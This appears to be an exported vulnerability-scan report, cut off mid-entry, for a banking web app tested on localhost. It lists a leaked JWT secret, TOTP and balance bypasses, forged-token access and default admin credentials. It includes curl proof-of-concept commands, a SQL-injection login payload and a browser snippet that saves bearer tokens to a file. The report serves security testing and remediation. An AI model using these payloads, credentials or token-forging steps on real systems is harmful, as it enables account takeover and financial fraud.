# Issue Export: 6 luna

- Site: Bank of Ed
- Exported: 27/09/2026, 12:38:43
- Total findings: 24

<!-- aespa-findings-json
%5B%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Public%20health%20endpoint%20exposes%20the%20JWT%20secret%22%2C%22description%22%3A%22The%20unauthenticated%20%2Fapi%2Fhealth%20response%20discloses%20the%20JWT%20secret%2C%20database%20host%2C%20database%20name%2C%20and%20database%20username.%22%2C%22impact%22%3A%22An%20attacker%20can%20obtain%20the%20signing%20secret%20and%20may%20be%20able%20to%20forge%20bearer%20tokens%20if%20the%20application%20uses%20it%20to%20validate%20them.%20The%20response%20also%20reveals%20database%20connection%20details.%22%2C%22likelihood%22%3A%22The%20endpoint%20returned%20the%20secret%20directly%20to%20a%20request%20with%20no%20Authorization%20header%20or%20cookies.%20Token%20forgery%20was%20not%20tested.%22%2C%22recommendation%22%3A%22Remove%20secrets%20and%20database%20credentials%20from%20health%20responses.%20Rotate%20the%20exposed%20JWT%20secret%2C%20invalidate%20tokens%20signed%20with%20it%2C%20and%20keep%20replacement%20secrets%20in%20protected%20configuration.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22An%20unauthenticated%20GET%20returned%20200%20with%20%5C%22jwt_secret%5C%22%3A%5C%22bankofed-dev-secret-change-in-production%5C%22%2C%20along%20with%20db_host%2C%20db_name%2C%20and%20db_user.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A18%3A47%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20253%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.4.25%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%5C%5C%2F2.4.68%20(Unix)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22root%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22bankofed-dev-secret-change-in-production%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A18%3A47%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20253%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.4.25%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%5C%5C%2F2.4.68%20(Unix)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22root%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22bankofed-dev-secret-change-in-production%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20the%20exact%20unauthenticated%20GET%20and%20received%20the%20same%20live%20JSON%20disclosure%2C%20including%20%60jwt_secret%60%2C%20%60db_host%60%2C%20%60db_name%60%2C%20and%20%60db_user%60%3B%20the%20response%20also%20labels%20the%20environment%20as%20%60production%60.%20The%20string's%20%60dev%60%20wording%20could%20suggest%20a%20placeholder%2C%20but%20there%20is%20no%20evidence%20that%20the%20endpoint%20returns%20a%20harmless%20example%20instead%20of%20configured%20values%2C%20so%20that%20does%20not%20explain%20away%20the%20exposed%20configuration.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A04%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22External%20transfer%20action%20bypasses%20TOTP%20and%20balance%20checks%22%2C%22description%22%3A%22The%20external%20transfer%20action%20endpoint%20accepts%20a%20manual%20transfer%20without%20the%20TOTP%20code%20required%20by%20its%20preflight%20check.%20It%20marks%20the%20transfer%20completed%20even%20though%20the%20source%20account%20has%20no%20available%20funds.%22%2C%22impact%22%3A%22A%20caller%20can%20create%20completed%20transfers%20without%20passing%20the%20advertised%20TOTP%20step%20or%20having%20funds%20in%20the%20source%20account.%20The%20evidence%20confirms%20the%20transfer%20was%20marked%20completed%2C%20but%20does%20not%20confirm%20that%20the%20recipient%20received%20funds.%22%2C%22likelihood%22%3A%22The%20behavior%20was%20reproduced%20with%20a%20disposable%20account%20and%20a%20%241%20transfer%20request.%22%2C%22recommendation%22%3A%22Enforce%20required%20TOTP%20verification%20and%20available-funds%20checks%20in%20the%20transfer%20action%20endpoint.%20Reject%20unverified%20or%20unfunded%20requests%2C%20and%20debit%20the%20source%20balance%20atomically%20before%20marking%20a%20transfer%20completed.%22%2C%22cvss_score%22%3A8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%22%2C%22evidence%22%3A%22A%20manual%20%241%20preflight%20for%20account%20101%20returned%20%60requires_totp%3A%20true%60.%20A%20subsequent%20POST%20to%20the%20action%20endpoint%20with%20the%20same%20transfer%20details%20and%20no%20%60totp_code%60%20returned%20HTTP%20201%20and%20%60status%3A%20completed%60%2C%20with%20%60totp_verified%3A%20false%60%20and%20%60new_from_balance%3A%20%5C%220.00%5C%22%60.%22%2C%22request_evidence%22%3A%22Preflight%3A%20%60%7Btransfer_type%3A%5C%22manual%5C%22%2Cfrom_account_id%3A101%2Camount%3A1%2Cto_bsb%3A%5C%22062-001%5C%22%2Cto_account_number%3A%5C%2212345678%5C%22%7D%60.%20Action%20used%20the%20same%20values%20plus%20a%20description%20and%20omitted%20%60totp_code%60.%22%2C%22response_evidence%22%3A%22Preflight%20returned%20%60requires_totp%3Atrue%60.%20Action%20returned%20HTTP%20201%20with%20a%20completed%20transaction%2C%20%60totp_verified%3Afalse%60%2C%20and%20an%20unchanged%20zero%20balance.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20replayed%20the%20account-101%20manual%20%241%20transfer%20using%20the%20matching%20%60logic_user%60%20session%20and%20the%20dummy%20recipient%20already%20present%20in%20the%20account%20history.%20With%20no%20%60totp_code%60%2C%20the%20action%20returned%20HTTP%20201%2C%20%60status%3A%20completed%60%2C%20%60totp_verified%3A%20false%60%2C%20and%20changed%20the%20zero%20balance%20to%20-1.00.%20The%20balance%20result%20differs%20from%20the%20scanner's%20report%20of%200.00%2C%20but%20the%20live%20replay%20still%20shows%20the%20endpoint%20completing%20a%20transfer%20without%20TOTP%20or%20sufficient%20funds%3B%20I%20found%20no%20account%20data%20indicating%20an%20overdraft%20allowance%2C%20and%20the%20supplied%20preflight%20evidence%20says%20TOTP%20is%20required.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A04%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22New%20customers%20can%20set%20a%20%241%20million%20credit%20limit%22%2C%22description%22%3A%22The%20account%20creation%20endpoint%20accepts%20a%20customer-supplied%20credit%20limit%20for%20a%20credit-card%20account%20and%20issues%20the%20account%20with%20that%20same%20amount.%20A%20newly%20registered%20test%20customer%20created%20an%20account%20with%20a%20%241%2C000%2C000%20limit%2C%20without%20an%20eligibility%20check%20or%20approval%20step.%22%2C%22impact%22%3A%22A%20registered%20user%20could%20obtain%20an%20unauthorized%20credit%20line%20of%20their%20choosing.%20If%20the%20balance%20can%20be%20spent%20or%20transferred%2C%20this%20could%20expose%20the%20service%20to%20substantial%20financial%20loss.%22%2C%22likelihood%22%3A%22High.%20A%20newly%20registered%20test%20customer%20received%20a%20%241%2C000%2C000%20limit%20immediately%20through%20the%20account%20creation%20API.%22%2C%22recommendation%22%3A%22Enforce%20a%20server-side%20maximum%20credit%20limit%20and%20apply%20eligibility%20and%20approval%20rules%20before%20issuing%20a%20card.%20Treat%20the%20requested%20limit%20as%20untrusted%20input%2C%20return%20the%20approved%20limit%20separately%2C%20and%20enforce%20it%20on%20every%20spending%20action.%22%2C%22cvss_score%22%3A8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%22%2C%22evidence%22%3A%22A%20POST%20to%20%60%2Fapi%2Faccounts%60%20as%20a%20new%20customer%20requested%20a%20credit-card%20account%20with%20%60credit_limit%3A1000000%60%20and%20returned%20HTTP%20201.%20The%20response%20created%20account%20ID%20104%20with%20both%20%60balance%60%20and%20%60credit_limit%60%20set%20to%20%601000000.00%60.%20The%20test%20account%20made%20no%20spending%20transactions.%22%2C%22request_evidence%22%3A%22The%20test%20account%20requested%20a%20%241%2C000%2C000%20credit%20limit%20and%20made%20no%20spending%20transactions.%22%2C%22response_evidence%22%3A%22The%20API%20created%20account%20ID%20104%20and%20returned%20a%20%241%2C000%2C000%20credit%20limit%20and%20matching%20balance.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20first%20request%20was%20rejected%20only%20because%20account_name%20was%20missing.%20Adding%20that%20required%20field%20and%20using%20the%20authenticated%20logic_user%20session%20returned%20201%20and%20created%20a%20credit_card%20account%20with%20both%20balance%20and%20credit_limit%20set%20to%201000000.00.%20The%20usual%20API%20documentation%20routes%20returned%20404%2C%20so%20I%20found%20no%20documented%20explanation%20for%20customers%20setting%20their%20own%20limit%3B%20the%20separate%20Amelia%20session%20had%20no%20Authorization%20header%20and%20could%20not%20test%20the%20behavior.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22account_name%5C%22%3A%5C%22Validation%20Review%20Card%5C%22%2C%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22credit_limit%5C%22%3A1000000%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**logic_user**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20logic_user%20account%20and%20copy%20its%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20DevTools%20Network%20panel.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A07%3A2021%20Identification%20and%20Authentication%20Failures%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Profile%20API%20accepts%20JWTs%20with%20invalid%20signatures%22%2C%22description%22%3A%22GET%20%2Fapi%2Fprofile%20accepts%20a%20bearer%20JWT%20with%20an%20altered%20HS256%20signature%20and%20uses%20its%20subject%20claim%20to%20return%20profile%20data%20for%20user%20ID%202.%22%2C%22impact%22%3A%22An%20unauthenticated%20caller%20can%20access%20user%202's%20profile%2C%20including%20the%20stored%20password%20hash.%22%2C%22likelihood%22%3A%22High.%20The%20request%20without%20credentials%20returned%20401%2C%20while%20the%20same%20request%20with%20a%20one-character%20change%20to%20the%20JWT%20signature%20returned%20200.%22%2C%22recommendation%22%3A%22Verify%20JWT%20signatures%20with%20the%20configured%20server-side%20key%20and%20reject%20tokens%20with%20invalid%20signatures%20before%20using%20their%20claims.%20Do%20not%20include%20password%20hashes%20in%20profile%20responses.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%22%2C%22evidence%22%3A%22A%20GET%20without%20an%20Authorization%20header%20or%20cookies%20returned%20HTTP%20401.%20A%20JWT%20with%20header%20alg%20HS256%20and%20subject%202%20returned%20user%202's%20profile%20after%20one%20character%20in%20its%20signature%20was%20changed.%20The%20HTTP%20200%20response%20included%20the%20profile's%20password_hash.%22%2C%22request_evidence%22%3A%22Control%3A%20GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%20with%20Authorization%3A%20none%20and%20Cookies%3A%20none.%20Test%3A%20same%20anonymous%20request%20with%20Authorization%3A%20Bearer%20%5BREDACTED_JWT%5D%20(one%20signature%20character%20changed%20from%20the%20recorded%20...CkC8%20token).%22%2C%22response_evidence%22%3A%22Control%20returned%20HTTP%20401%20with%20%60%5C%22message%5C%22%3A%5C%22Missing%20or%20invalid%20Authorization%20header.%5C%22%60%20The%20modified-signature%20request%20returned%20HTTP%20200%20and%20%60%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22id%5C%22%3A2%2C%5C%22email%5C%22%3A%5C%22wei.zhang%40example.com%5C%22%2C...%2C%5C%22password_hash%5C%22%3A%5C%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%5C%22...%7D%7D%60.%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20exact%20listed%20%60invalid_sig_user2%60%20bearer%20session%20returns%20HTTP%20200%20with%20user%202's%20profile%2C%20including%20%60password_hash%60%2C%20while%20a%20request%20with%20no%20Authorization%20header%20returns%20401.%20The%20ordinary%20listed%20sessions%20did%20not%20provide%20a%20benign%20explanation%3A%20they%20were%20rejected%20as%20invalid%20or%20expired%2C%20while%20the%20specifically%20named%20invalid-signature%20session%20was%20accepted%20and%20returned%20%60wei.zhang%40example.com%60.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**invalid_sig_user2**%20or%20an%20equivalent%20user).%5Cn%5CnUse%20the%20supplied%20user-ID-2%20test%20JWT%20with%20one%20character%20changed%20in%20its%20signature%20segment.%20Capture%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser%20Network%20tab.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Unauthenticated%20health%20endpoint%20exposes%20JWT%20signing%20secret%22%2C%22description%22%3A%22An%20unauthenticated%20GET%20to%20%2Fapi%2Fhealth%20returns%20the%20HS256%20JWT%20signing%20secret.%20A%20token%20signed%20with%20that%20value%20was%20accepted%20by%20the%20protected%20%2Fapi%2Fprofile%20endpoint.%22%2C%22impact%22%3A%22An%20attacker%20who%20can%20reach%20the%20health%20endpoint%20can%20forge%20accepted%20JWTs%20and%20impersonate%20accounts.%20The%20test%20confirmed%20access%20to%20a%20user's%20private%20profile.%22%2C%22likelihood%22%3A%22High.%20The%20endpoint%20exposes%20the%20signing%20secret%20without%20authentication%2C%20and%20a%20token%20signed%20with%20it%20was%20accepted.%20The%20same%20profile%20request%20without%20a%20token%20returned%20HTTP%20401.%22%2C%22recommendation%22%3A%22Remove%20signing%20secrets%20and%20database%20credentials%20from%20health%20responses.%20Rotate%20the%20JWT%20signing%20key%20and%20invalidate%20tokens%20signed%20with%20it.%20Load%20a%20high-entropy%20key%20from%20protected%20runtime%20configuration%2C%20and%20limit%20health%20output%20to%20non-sensitive%20status%20checks.%22%2C%22cvss_score%22%3A8.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22Anonymous%20GET%20%2Fapi%2Fhealth%20returned%20the%20JWT%20secret%20%5C%22bankofed-dev-secret-change-in-production%5C%22.%20A%20controlled%20HS256%20token%20signed%20with%20that%20secret%2C%20including%20user_id%3D1%20and%20role%3Duser%2C%20received%20HTTP%20200%20from%20GET%20%2Fapi%2Fprofile%20and%20returned%20profile%20data%20for%20Amelia%20Chen.%20The%20same%20profile%20request%20without%20a%20token%20returned%20HTTP%20401.%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%20with%20Authorization%3A%20none%20and%20Cookies%3A%20none.%20Separately%2C%20GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%20with%20Authorization%3A%20Bearer%20%3Ccontrolled%20HS256%20token%20signed%20with%20the%20exposed%20secret%3E.%22%2C%22response_evidence%22%3A%22The%20anonymous%20health%20response%20contains%20%5C%22jwt_secret%5C%22%3A%5C%22bankofed-dev-secret-change-in-production%5C%22.%20The%20signed-token%20profile%20request%20returned%20HTTP%20200%3B%20the%20anonymous%20profile%20baseline%20returned%20HTTP%20401%20with%20%5C%22Missing%20or%20invalid%20Authorization%20header.%5C%22%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22An%20anonymous%20GET%20to%20%2Fapi%2Fhealth%20returned%20the%20JWT%20secret%20in%20the%20live%20JSON%20response.%20I%20signed%20a%20token%20with%20that%20value%20and%20the%20reported%20user_id%3D1%20and%20role%3Duser%20claims%2C%20adding%20the%20jti%20required%20by%20the%20middleware%3B%20GET%20%2Fapi%2Fprofile%20then%20returned%20HTTP%20200%20with%20Amelia%20Chen's%20profile.%20That%20rules%20out%20the%20benign%20explanation%20that%20the%20exposed%20value%20is%20only%20a%20stale%20or%20unused%20example%20secret.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Weak%20admin%20credentials%20accepted%22%2C%22description%22%3A%22The%20admin%20login%20accepted%20username%20%60admin%60%20and%20password%20%60admin123%60%20and%20returned%20an%20admin%20JWT.%20The%20resulting%20session%20could%20read%20another%20customer's%20personal%20and%20account%20data.%22%2C%22impact%22%3A%22Anyone%20who%20obtains%20or%20guesses%20these%20credentials%20could%20access%20sensitive%20customer%20records%20and%20use%20admin%20functions.%22%2C%22likelihood%22%3A%22Likely%20if%20the%20admin%20login%20is%20reachable%2C%20because%20the%20observed%20password%20is%20easy%20to%20guess.%22%2C%22recommendation%22%3A%22Replace%20weak%20or%20shared%20admin%20credentials%20with%20unique%20strong%20passwords%2C%20require%20MFA%20for%20admin%20accounts%2C%20and%20avoid%20shipping%20usable%20default%20credentials.%22%2C%22cvss_score%22%3A8.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%22%2C%22evidence%22%3A%22POST%20with%20%60%7B%5C%22username%5C%22%3A%5C%22admin%5C%22%2C%5C%22password%5C%22%3A%5C%22admin123%5C%22%7D%60%20returned%20200%20and%20an%20admin%20JWT.%20A%20subsequent%20request%20using%20that%20session%20returned%20another%20customer's%20profile%20and%20account%20balances.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%5C%22username%5C%22%3A%20%5C%22'%20OR%20'1'%3D'1'%20--%20%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22not-a-password%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A58%3A57%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2098%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INVALID_CREDENTIALS%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20username%20or%20password.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%5C%22username%5C%22%3A%20%5C%22'%20OR%20'1'%3D'1'%20--%20%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22not-a-password%5C%22%7D%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A58%3A57%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2098%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INVALID_CREDENTIALS%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20username%20or%20password.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20exact%20anonymous%20login%20request%20with%20username%20%60admin%60%20and%20password%20%60admin123%60%20returned%20200%20and%20issued%20an%20admin%20JWT.%20I%20saved%20a%20fresh%20token%20from%20those%20same%20credentials%2C%20then%20used%20it%20on%20%60GET%20%2Fapi%2Fadmin%2Fcustomers%60%3B%20it%20returned%20records%20for%20multiple%20customers%2C%20including%20names%20and%20email%20addresses.%20This%20confirms%20the%20credentials%20grant%20real%20admin%20access%2C%20so%20there%20is%20no%20benign%20explanation%20for%20the%20reported%20login.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22username%5C%22%3A%5C%22admin%5C%22%2C%5C%22password%5C%22%3A%5C%22admin123%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Admin%20login%20does%20not%20throttle%20repeated%20failures%22%2C%22description%22%3A%22The%20admin%20login%20endpoint%20accepted%20six%20consecutive%20incorrect-password%20attempts%20for%20the%20known%20%60admin%60%20account%20without%20showing%20a%20lockout%2C%20CAPTCHA%2C%20rate-limit%20response%2C%20or%20increase%20in%20response%20time.%22%2C%22impact%22%3A%22An%20attacker%20could%20automate%20password%20guessing%20against%20the%20privileged%20admin%20account.%20If%20successful%2C%20account%20compromise%20could%20expose%20customer%20records%20and%20allow%20balance%20or%20account%20administration.%22%2C%22likelihood%22%3A%22The%20observed%20six-attempt%20sequence%20completed%20without%20a%20visible%20throttle.%20This%20confirms%20the%20behavior%20for%20the%20tested%20sequence%20but%20does%20not%20establish%20the%20endpoint's%20behavior%20beyond%20those%20attempts.%22%2C%22recommendation%22%3A%22Apply%20per-account%20and%20per-source%20rate%20limits%20to%20the%20admin%20login%20endpoint%2C%20with%20increasing%20delays%20and%20temporary%20lockout%20or%20step-up%20verification%20after%20repeated%20failures.%20Monitor%20repeated%20failures%20and%20keep%20login%20error%20responses%20generic.%22%2C%22cvss_score%22%3